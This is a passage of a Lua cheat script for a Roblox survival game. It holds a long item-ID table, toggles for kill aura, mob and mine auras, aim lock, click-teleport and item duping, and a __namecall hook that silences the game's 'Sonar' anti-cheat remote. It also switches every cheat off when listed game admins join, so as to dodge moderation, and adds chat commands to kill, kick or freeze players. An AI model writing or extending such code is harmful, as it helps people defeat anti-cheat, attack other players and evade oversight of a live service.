    [131] = "Medium Stone Base",
    [132] = "Large Stone Base",
    [133] = "Repair Hammer",
    [134] = "Unrefined Zenyte",
    [135] = "Zenyte",
    [136] = "Totem",
    [137] = "Caveberry",
    [138] = "Slime Ball",
    [139] = "Slime Helmet",
    [140] = "Slime Body",
    [141] = "Slime Legs",
    [142] = "Slime Boots",
    [143] = "Slimy Pack",
    [144] = "Zenyte Helmet",
    [145] = "Zenyte Body",
    [146] = "Zenyte Storage Chest",
    [147] = "Zenyte Legs",
    [148] = "Zenyte Boots",
    [149] = "Zenyte Wall",
    [150] = "Zenyte Gate",
    [151] = "Zenyte Bag",
    [152] = "Slime Club",
    [153] = "Zenyte Harvester",
    [154] = "Diamond Sword",
    [155] = "Wooden Mine Cart",
    [156] = "Party Cart",
    [157] = "Silver Mine Cart",
    [158] = "Ruby Mine Cart",
    [159] = "Zenyte Mine Cart",
    [160] = "Coal",
    [161] = "Infinite Furnace",
    [162] = "Beginner Wand",
    [163] = "Clue Scroll (Easy)",
    [164] = "Clue Scroll (Medium)",
    [165] = "Clue Scroll (Hard)",
    [166] = "Treasure Chest (Easy)",
    [167] = "Treasure Chest (Medium)",
    [168] = "Treasure Chest (Hard)",
    [169] = "Shovel",
    [170] = "Clue Bottle (Easy)",
    [171] = "Clue Bottle (Medium)",
    [172] = "Clue Bottle (Hard)",
    [173] = "Lucky Sword",
    [174] = "Lucky Bow",
    [175] = "Lucky Helmet",
    [176] = "Lucky Body",
    [177] = "Lucky Legs",
    [178] = "Lucky Boots",
    [179] = "Lucky Harvester",
    [180] = "Lucky Fruit",
    [181] = "Candy",
    [182] = "Kerosene Lamp",
    [183] = "Sleigh",
    [184] = "Magical Sleigh",
    [185] = "Grinch's Sleigh",
    [186] = "Candy Bag",
    [187] = "Pile of Candy",
    [188] = "Candy Pack",
    [189] = "Explorer Energy",
    [190] = "Cave Door Key (d)",
    [191] = "Key Handle (d)",
    [192] = "Key Shaft (d)",
    [193] = "Cave Door Key (z)",
    [194] = "Key Handle (z)",
    [195] = "Key Shaft (z)",
    [196] = "Stone Anvil",
    [197] = "Silver Crossbow",
    [198] = "Diamond Crossbow",
    [199] = "Zenyte Crossbow",
    [200] = "Soul",
    [201] = "Soul Helmet",
    [202] = "Soul Body",
    [203] = "Soul Legs",
    [204] = "Soul Boots",
    [205] = "Zenyte Sword",
    [206] = "Wooden Shield",
    [207] = "Silver Shield",
    [208] = "Golden Shield",
    [209] = "Ruby Shield",
    [210] = "Diamond Shield",
    [211] = "Zenyte Shield",
    [212] = "Golden Anvil",
    [213] = "Diamond Anvil",
    [214] = "Cave Key Pack",
    [215] = "OP Sword",
    [216] = "Soul Sword",
    [217] = "Soul Bag",
    [218] = "Soul Shield",
    [219] = "Lucky Shield",
    [220] = "Soul Key",
    [221] = "Pirate Ship",
    [222] = "Springy Boots",
    [223] = "Volcanic Ore",
    [224] = "Obsidian",
    [225] = "Obsidian Helmet",
    [226] = "Obsidian Body",
    [227] = "Obsidian Legs",
    [228] = "Obsidian Boots",
    [229] = "Volcanic Furnace",
    [230] = "Obsidian Club",
    [231] = "Obsidian Wall",
    [232] = "Obsidian Gate",
    [233] = "Obsidian Storage Chest",
    [234] = "Harpoon Turret",
    [235] = "Obsidian Shield",
    [236] = "Obsidian Bag",
    [237] = "Instakill Sword",
    [238] = "Pearl Helmet",
    [239] = "Pearl Body",
    [240] = "Pearl Legs",
    [241] = "Pearl Boots",
    [242] = "Raw Seaweed",
    [243] = "Cooked Seaweed",
    [244] = "Pink Shell",
    [245] = "White Shell",
    [246] = "Orange Shell",
    [247] = "Pearl",
    [248] = "Seaglass",
    [249] = "Seaglass Helmet",
    [250] = "Seaglass Body",
    [251] = "Seaglass Legs",
    [252] = "Seaglass Boots",
    [253] = "White Shell Sword",
    [254] = "Pink Shell Sword",
    [255] = "Orange Shell Sword",
    [256] = "White Shell Harvester",
    [257] = "Pink Shell Harvester",
    [258] = "Orange Shell Harvester",
    [259] = "Shell Helmet",
    [260] = "Shell Body",
    [261] = "Shell Legs",
    [262] = "Flippers",
    [263] = "Poison Seaweed",
    [264] = "Stone Trap",
    [265] = "Ruby Trap",
    [266] = "Zenyte Trap",
    [267] = "Pink Egg",
    [268] = "Purple Egg",
    [269] = "Red Egg",
    [270] = "Yellow Egg",
    [271] = "Easter Candy",
    [272] = "Easter Glider",
    [273] = "Repairio Spellbook",
    [274] = "Warrior Energy",
    [275] = "Protector Energy",
    [276] = "Magic Portal",
    [277] = "Healing Aura",
    [278] = "Electric Aura",
    [279] = "Hunger Aura",
    [280] = "Book of Exploration (I)",
    [281] = "Book of Exploration (II)",
    [282] = "Book of Exploration (III)",
    [283] = "Book of Protection (I)",
    [284] = "Book of Protection (II)",
    [285] = "Book of Protection (III)",
    [286] = "Book of Combat (I)",
    [287] = "Book of Combat (II)",
    [288] = "Book of Combat (III)",
    [289] = "Apprentice Wand",
    [290] = "Adept Staff",
    [291] = "Master Staff",
    [292] = "Transcended Staff",
    [293] = "Visionary Staff",
    [294] = "Wool",
    [295] = "Book",
    [296] = "Magical Book",
    [297] = "Obsidian Harvester",
    [298] = "Magic Repair Table (I)",
    [299] = "Magic Repair Table (II)",
    [300] = "Magic Repair Table (III)",
    [301] = "Glider",
    [302] = "Imbue Spellbook",
    [303] = "Shieldio Spellbook",
    [304] = "Hungaria Spellbook",
    [305] = "Baseio Retreatio Spellbook",
    [306] = "Healia Spellbook",
    [307] = "Deadia Protectia Spellbook",
    [308] = "Baseio Destroyio Spellbook",
    [309] = "Oofio Spellbook",
    [310] = "Freezio Spellbook",
    [311] = "Starvio Spellbook",
    [312] = "Electricia Spellbook",
    [313] = "Portalio Spellbook",
    [314] = "Protectio Claimio Spellbook",
    [315] = "Warrio Claimio Spellbook",
    [316] = "Explorer Energy Pack",
    [317] = "Protector Energy Pack",
    [318] = "Warrior Energy Pack",
    [319] = "Explorer Energy Stack",
    [320] = "Protector Energy Stack",
    [321] = "Warrior Energy Stack",
    [322] = "Infinite Bag",
    [323] = "Deflectio Projectio Spellbook",
    [324] = "Seed Pack",
    [325] = "Fruit Pack",
    [326] = "Diamond Hero Pack",
    [327] = "Zenyte Warrior Pack",
    [328] = "Box of Redberries",
    [329] = "Box of Coconuts",
    [330] = "Box of Bananas",
    [331] = "Box of Watermelons",
    [332] = "Potato Seed Box",
    [333] = "Cabbage Seed Box",
    [334] = "Carrot Seed Box",
    [335] = "Watermelon Seed Box",
    [336] = "Halloween Pumpkin",
    [337] = "Jack-o'-lantern",
    [338] = "Weak Pet Net",
    [339] = "Sturdy Pet Net",
    [340] = "Strong Pet Net",
    [341] = "Unbreakable Pet Net",
    [342] = "Christmas Present",
    [343] = "Snowball",
    [344] = "Obsidian Floor",
    [345] = "Pile of Snowballs",
    [346] = "Snowball Pack",
    [347] = "Silver Snowball",
    [348] = "Golden Snowball",
    [349] = "Ruby Snowball",
    [350] = "Diamond Snowball",
    [351] = "Zenyte Snowball",
    [352] = "Obsidian Snowball",
    [353] = "Candy Snowball",
    [354] = "Starter Sword",
    [355] = "Starter Harvester",
    [356] = "Starter Helmet",
    [357] = "Starter Body",
    [358] = "Starter Legs",
    [359] = "Starter Boots",
    [360] = "Lunar Ore",
    [361] = "Moonstone",
    [362] = "Lunario Enchantio Spellbook",
    [363] = "Moonstone Helmet",
    [364] = "Moonstone Body",
    [365] = "Moonstone Legs",
    [366] = "Moonstone Boots",
    [367] = "Moonstone Shield",
    [368] = "Moonstone Harvester",
    [369] = "Moonstone Sword",
    [370] = "Moonstone Bag",
    [371] = "Potion Cauldron",
    [372] = "Candy Potion",
    [373] = "Moonstone Storage Chest",
    [374] = "Moonstone Wall",
    [375] = "Moonstone Gate",
    [376] = "Moonstone Crossbow",
    [377] = "Lunar Arrow",
    [378] = "Pumpkin",
    [379] = "Pumpkin Shield",
    [380] = "Pumpkin Bag",
    [381] = "Pumpkin Seeds",
    [382] = "Treasure Chest Pack",


}



ALLITEMSTABLE = ALLITEMS
SWITCHEDITEMSTABLE = {}
for id, name in pairs(ALLITEMS) do
    ALLITEMSTABLE[id] = name      -- Maps the numeric ID to the item name
    SWITCHEDITEMSTABLE[name] = id -- Maps the item name back to the numeric ID
end
getgenv().configs = {
    Bypassing = false;
    AutoPickup2 = false;
    InfJump = false;
    ClickTp = false;
    AutoEat = false;
    MineAura = false;
    MobAura = false;
    CheaterDetector = false;
    KillAura = false;
    PlayerLock = false;
    Pumpkins = false;
    Hitbox = false;
    SafeDeath = false;
    OpKillAura = false;
	PredictOpKillAura = false;
    AutoRepairClub = false;
    ConiferFarm = false;
    UseSoulKeys = false;
    ObsidianBoss = false;
    ZenLuckBoss = false;
    SpiritBoss = false;
    LuckySlime = false;
    EvilSkeleton = false;
    Ogre = false;
    Squid = false;
    JumpPower = false;
    AntiRagDoll = false;
    ExtraSpeed = false;
    AmountToLoopDrop = false;
    PlayerEsp = false;
    EatingType = 'AFK';
    TrapType = 'Stone Trap';
    LevelCheck = 'True';
    ChestType = 'Any';
}
getgenv().QuickSpeedMultiplier = 1
getgenv().AmountOfChestInserts = 1
getgenv().PredictAmount = 3
getgenv().QuickSpeedKey = Enum.KeyCode.B
getgenv().GliderModSpeed = 30


--RemoteEvents
RemoteEvents = {
    ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
    InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
    UpdateStorageChest =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("UpdateStorageChest");
    SetSettings = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("SetSettings");
    BuyWorldEvent =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("BuyWorldEvent");
    ItemInteracted =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ItemInteracted");
    CraftItem =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("CraftItem");
    TradeTrader =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("TradeTrader");
    KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
    Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
}
--Important locals
local MyInventory = LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Menus'):FindFirstChild('Inventory'):FindFirstChild('Inventory'):FindFirstChild('List')
local Whitelist_table = {};
local OpKillAuraTable = {};
local realgameadmins = {849400193, 134488231, 146733116, 27865601}
local MoonstoneSet = {363, 364, 365, 366}
local ObsidianSet = {225, 226, 227, 228}
local AllShields = {206, 207, 208, 209, 210, 211, 219, 235, 367, 379}
local AllSwords = {173, 205, 230, 369, 255, 254, 253}
local AllBows = {174, 197, 198, 199, 376}
local AllBooks = {281, 282, 283, 284, 285, 286, 287, 296, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 323, 362}
local AllStaffs = {293, 292, 291, 290, 162, 289}

--Safe Death Connections
local TimeTped
local TimeBetweenTps
local TeleportHappened = false
local SafeDeathHealthChecker = nil

--Boss Death connections
local AutoPickupOnObsidianDeath
local AutoPickupOnZenLuckBossDeath
local AutoPickupOnSpiritBossDeath
local AutoPickuponLuckySlimeDeath
local AutoPickupOnSkeletonDeath
local AutoPickupOnOgreDeath
local AutoPickupOnSquidDeath

--Dupe locals
local ItemIndexed
local ItemIndexedNumber

--Admin Module
local Players = game:GetService("Players")

-- Define a list of admin user IDs
local adminUserIDs = {
    -- Add user IDs of admins here
    162080939,  -- Replace with actual user IDs
    987654321,
}

-- Function to check if a player is an admin
local function isAdmin(player)
    return table.find(adminUserIDs, player.UserId) ~= nil
end

-- Function to kill a player
local function killPlayer(player)
    local Character = GetCharacter(player.name)
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
    end
end

-- Function to kick a player
local function kickPlayer(player, targetPlayer)
    if targetPlayer and targetPlayer ~= player then
        targetPlayer:Kick("You have been kicked by an admin.")
    end
end

-- Function to freeze a player
local function freezePlayer(player)
    local character = GetCharacter(player.name)

    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = true
        end
    end
end

-- Function to unfreeze a player
local function unfreezePlayer(player)
    local character = GetCharacter(player.name)
    if character then
        local rootPart = character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = false
        end
    end
end

-- Function to handle player chat and check for admin commands
local function onPlayerChat(player, message)
    if isAdmin(player) then
        if message:lower():sub(1, 5) == ".kill" then
            local playerNameToKill = message:sub(7)
            local targetPlayer = Players:FindFirstChild(playerNameToKill)
            killPlayer(targetPlayer)
        elseif message:lower():sub(1, 5) == ".kick" then
            local playerNameToKick = message:sub(7)
            local targetPlayer = Players:FindFirstChild(playerNameToKick)
            kickPlayer(player, targetPlayer)
        elseif message:lower():sub(1, 7) == ".freeze" then
            local playerNameToFreeze = message:sub(9)
            local targetPlayer = Players:FindFirstChild(playerNameToFreeze)
            freezePlayer(targetPlayer)
        elseif message:lower():sub(1, 9) == ".unfreeze" then
            local playerNameToUnfreeze = message:sub(11)
            local targetPlayer = Players:FindFirstChild(playerNameToUnfreeze)
            unfreezePlayer(targetPlayer)
        -- Add more admin commands here
        end
    end
end

-- Listen for chat messages from all players
for _, player in pairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        onPlayerChat(player, msg)
    end)
end

-- Listen for new players and their chat messages
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onPlayerChat(player, msg)
    end)
end)

--Aimbot locals
local CurrentlyLocked
local Aiming = false

--Quickspeed locals
local OnOff = false
local keydetected

--Pages
local Main = AtlasUi:CreatePage("Main")

local Combat = AtlasUi:CreatePage("Combat")

local Dupe = AtlasUi:CreatePage("Dupe & Spawn")

local Visuals = AtlasUi:CreatePage("Visuals")

local LPlayer = AtlasUi:CreatePage("LocalPlayer")

local Chests = AtlasUi:CreatePage("Treasure Chests")

local Farming = AtlasUi:CreatePage("Farm")

local Teleports = AtlasUi:CreatePage("Teleports")

local OtherStuff = AtlasUi:CreatePage("Resources")

local AutoSell = AtlasUi:CreatePage("AutoSell")

--stop everything if an admin joins
Players.PlayerAdded:Connect(function(admin)
    if table.find(realgameadmins, admin.UserId) then
        if admin.UserId == '134488231' then
            MakeAtlasNotification('Owner Joined', "Owner joined; carefull, ill disable everything for you", 30)
        else
            MakeAtlasNotification("Game Admin Joined: "..admin.Name, "Admin joined; carefull, ill disable everything for you", 30)
        end
        task.spawn(function()
            repeat task.wait(1)
                for setting, value in pairs(getgenv().configs) do
                    if type(value) == 'boolean' then
                        getgenv().configs[setting] = false
                    end
                end
            until not Players:FindFirstChild(admin.Name)
            if admin.UserId == '134488231' then
                MakeAtlasNotification('Owner left', "Interesting interaction", 30)
            else
                MakeAtlasNotification('Admin left', "Ok the admin is gone.", 15)
            end
        end)
    end
end)

--setup ac bypass
if not getgenv().bypassing then
    getgenv().bypassing = true
    local bypassac

    bypassac = hookmetamethod(game, '__namecall', function(self, ...)
        local args = {...}
        if not checkcaller() and self == RemoteEvents['Sonar'] then
            return nil
        end
        return bypassac(self, ...)
    end) 
end

--Antiafk
if not getgenv().Idling ~= true then
    getgenv().Idling = true
    LocalPlayer.Idled:connect(function()
	    VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
	    task.wait(1)
	    VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
end

--Functions
function IsPlayerAlive(player)
    if player.Character and player.Character:FindFirstChild('Humanoid') and player.Character:FindFirstChild('HumanoidRootPart') and player.Character:FindFirstChild('Humanoid').Health > 0 then
        return true
    end
    return false
end


function GetClosestChest()
    local closest
    local range = math.huge
    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
    if IsPlayerAlive(LocalPlayer) then
        for _, chest in pairs(Workspace:WaitForChild("Replicators")[checkpassivenonpassive]:GetChildren()) do
            if string.find(chest.Name, 'Storage') and chest:FindFirstChildOfClass('MeshPart') then
                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
                if dist < range then
                 range = dist
                 closest = chest
                end
            end
        end
        return closest
    end
end

local function IsArmorLevel(piece)
    if getgenv().LevelCheck == 'False' then return true end
    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
    if tonumber(lvl) == 10 then
        return true
    end
end

local function IsLevel(piece)
    if getgenv().LevelCheck == 'False' then return true end
    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
    if tonumber(lvl) == 5 then
        return true
    end
end

local function SellItem(Item, SellAmount, Id)
    local GetItem = MyInventory:FindFirstChild(Item)
    if GetItem then
        local NumberOfItem = string.match(GetItem:FindFirstChild('Top'):FindFirstChild('NameLabel').Text, '%d+')
        if not NumberOfItem then
            NumberOfItem = 1
        end
        if tonumber(NumberOfItem) >= SellAmount then
            RemoteEvents['TradeTrader']:FireServer('Resource Trader', Id)
        end
    end
end

function AutoPickup()
    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
    if IsPlayerAlive(LocalPlayer) then
        local AllPickups = {}
        local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
        for _, item in pairs(Workspace:WaitForChild('Replicators')[checkpassivenonpassive]:GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        for _, item in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        for _, item in pairs(Workspace:GetChildren()) do
            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
                if table.find(ALLITEMSTABLE, item.Name) then
                    table.insert(AllPickups, item)
                end
            end
        end
        if #AllPickups > 0 then
            for _, getitem in ipairs(AllPickups) do
                repeat task.wait()
					local mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/')
					if tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) then return false end 
                    if IsPlayerAlive(LocalPlayer) then
                        if getitem.Parent then
                            RemoteEvents['ItemInteracted']:FireServer(getitem, "Pickup")
                        end
                    end
                until not getitem.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - getitem:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer)
            end
        end
    end
end

function AutoPickup2()
    if getgenv().configs.AutoPickup2 then
        if not getgenv().AutoPickingUp then
            getgenv().AutoPickingUp = Workspace.DescendantAdded:Connect(function(pickup)
				local mybagspace
                if not getgenv().configs.AutoPickup2 then
                    getgenv().AutoPickingUp:Disconnect()
                    getgenv().AutoPickingUp = nil
                    return
                end
                if not string.find(pickup.Name:lower(), 'clue') then
                    if table.find(ALLITEMSTABLE, pickup.Name) then
                        if IsPlayerAlive(LocalPlayer) then
                            local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
                            local itempos = pickup:GetPivot().Position
                            if (mypos - itempos).magnitude < 18.5 then
                                repeat task.wait()
									mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/') 
                                    if IsPlayerAlive(LocalPlayer) then
                                        if pickup.Parent then
                                            RemoteEvents['ItemInteracted']:FireServer(pickup, "Pickup")
                                        end
                                    end
                                until not pickup.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - pickup:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.AutoPickup2
                            end
                        end
                    end
                end
            end)
        end
        AutoPickup()
    else
        if getgenv().AutoPickingUp then
            getgenv().AutoPickingUp:Disconnect()
            getgenv().AutoPickingUp = nil
        end
    end
end

function ClickTp()
    if getgenv().configs.ClickTp then
        if not getgenv().MouseClick then
            getgenv().MouseClick = UserInputService.InputBegan:Connect(function(input)
                if getgenv().configs.ClickTp then
                    if not UserInputService:GetFocusedTextBox() then
                        if input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
                            if IsPlayerAlive(LocalPlayer) then
                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.Position)
                            end
                        end
                    end
                end
            end)
        end
    end
end

function AutoEat()
    local function GreatestFoodSource()
        local foodtable = {}
        local highestfood
        local greatestfoodpossible = -math.huge
        
        for _, food in pairs(MyInventory:GetChildren()) do
            if food.Name == 'Raw Potato' or food.Name == 'Watermelon' or food.Name == 'Banana' or food.Name == 'Redberry' or food.Name == 'Coconut' or food.Name == 'Baked Potato' or food.Name == 'Carrot'  or food.Name == 'Cabbage' or food.Name == 'Cooked Fish' or food.Name == 'Cooked Meat' or food.Name == 'Caveberry' or food.Name == 'Slime Ball' or food.Name == 'Lucky Fruit' then
                table.insert(foodtable, food)
            end
        end
        for _, food in pairs(foodtable) do
            local foodamount = tonumber(string.match(food:WaitForChild('Top'):WaitForChild('NameLabel').Text, '%d+'))
            if foodamount and foodamount > greatestfoodpossible then
                greatestfoodpossible = foodamount
                highestfood = food.Name
            end
        end
        return highestfood
    end
    local maxhungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar').AbsoluteSize
    local subbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Health'):WaitForChild('Bar'):WaitForChild('Sub')
    while getgenv().configs.AutoEat do
        if getgenv().configs.AutoEat then
            task.wait()
            local Food = GreatestFoodSource()
            if Food then
                if getgenv().configs.EatingType == 'AFK' then
                    local currenthungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar'):WaitForChild('Bar').AbsoluteSize
                    if IsPlayerAlive(LocalPlayer) then
                        if (maxhungerbar - currenthungerbar).magnitude >= 20.7 then
                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
                            task.wait()
                        end
                    end
                elseif getgenv().configs.EatingType == 'War' then
                    local maxsubbar = subbar.Parent.AbsoluteSize
                    if IsPlayerAlive(LocalPlayer) then
                        if (maxsubbar - subbar.AbsoluteSize).magnitude >= 20.7 then
                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
                            task.wait()
                        end
                    end
                end
            end
        end
    end
end

function MineAura()
    while getgenv().configs.MineAura do
        if getgenv().configs.MineAura then
            task.wait(0.3)
            if IsPlayerAlive(LocalPlayer) then
                local function getclosestore()
                    local range = 21
                    local closestore
                    for _, ore in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
                        if not string.find(ore.Name:lower(), 'slime') then
                            if Workspace:FindFirstChild("Volcanic Rock") then
                                Workspace:FindFirstChild("Volcanic Rock").Parent = Workspace:WaitForChild('Replicators'):WaitForChild('Both')
                            end
                            if ore:FindFirstChild('Health') and not ore:FindFirstChild('Humanoid') and not ore:FindFirstChild('HumanoidRootPart') then
                                local obj
                                local dist
                                obj = ore:GetPivot().Position
                                local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                dist = (mypos - obj).magnitude
                                if dist < range then
                                    if ore.Name == 'Plantain' then
                                        if ore:FindFirstChild('Tree') and ore:FindFirstChild('Tree'):FindFirstChild('Palm Tree_Trunk') then
                                            obj = Vector3.new(3378, 15, -4475)
                                        end
                                    end
                                    dist = (mypos - obj).magnitude
                                    range = dist
                                    closestore = ore
                                end
                            end
                        end
                    end
                    return closestore
                end
                local NearestOre = getclosestore()
                if NearestOre then
                    RemoteEvents['ToolAction']:FireServer(NearestOre)
                end
            end
        end
    end
end

function MobAura()
    while getgenv().configs.MobAura do
        if getgenv().configs.MobAura then
            task.wait(.15)
            local function getclosestmob()
                local range = 30
                local closestmob = nil
                if IsPlayerAlive(LocalPlayer) then
                    for _, mob in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
                        if mob:FindFirstChild('HumanoidRootPart') and mob:FindFirstChild('Humanoid') and mob:FindFirstChild('Humanoid').Health > 0 then
                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                            local mobpos = mob.HumanoidRootPart.Position
                            local dist = (mypos - mobpos).magnitude
                            if dist < range then
                                range = dist
                                closestmob = mob
                            end
                        end
                    end
                end
                return closestmob
            end
            local nearestmob = getclosestmob()
            if nearestmob then
                RemoteEvents['ToolAction']:FireServer(nearestmob)
            end
        end
    end
end

function KillAura()
    while getgenv().configs.KillAura do
        if getgenv().configs.KillAura then
            task.wait()
            local function GetClosestKAPlayer()
                local range = 32
                local closest
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr ~= LocalPlayer then
                        if not table.find(Whitelist_table, plr.Name) then
                            if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                                local char = plr.Character
                                if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
                                    if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
                                        local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                        local plrpos = plr.Character.HumanoidRootPart.Position
                                        local dist = (mypos - plrpos).magnitude
                                        if dist < range then
                                            range = dist
                                            closest = plr.Character
                                        end
                                    else
                                        if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
                                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
                                            local plrpos = plr.Character.HumanoidRootPart.Position
                                            local dist = (mypos - plrpos).magnitude
                                            if dist < range then
                                                range = dist
                                                closest = plr.Character
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
                return closest
            end
            local NearestPlayer = GetClosestKAPlayer()
            if NearestPlayer then
                RemoteEvents['ToolAction']:FireServer(NearestPlayer)
            end
        end
    end
end

function PlayerLock()
    local function Wallcheck(target)
        local ray = Ray.new(Camera.CFrame.Position, (target.Position - Camera.CFrame.Position).Unit * 1000)
        local part, position = Workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character}, false, true)
        if part then
            local humanoid = part.Parent:FindFirstChildOfClass('Humanoid')
            if not humanoid then
                humanoid = part.Parent.Parent:FindFirstChildOfClass('Humanoid')
            end
            if humanoid and target and humanoid.Parent == target.Parent then
                local pos, visible = Camera:WorldToScreenPoint(target.Position)
                if visible then
                    return true
                end
            end
        end
        return false
    end
    local function GetNearestPlayerToMouse()
        if CurrentlyLocked and CurrentlyLocked.Humanoid.Health > 0 then return CurrentlyLocked end
        local dist = 150
        local closest
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local char = plr.Character
                    local plrpos, onscreen = Camera:WorldToViewportPoint(char['HumanoidRootPart'].Position)
                    if onscreen then
                        if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
                            if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
                                local mag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(plrpos.X, plrpos.Y)).Magnitude
                                if mag < dist and (char.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude < dist then
                                    if Wallcheck(char:FindFirstChild('HumanoidRootPart')) then
                                        dist = mag
                                        closest = char
                                    end
                                end
                            else
                                if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
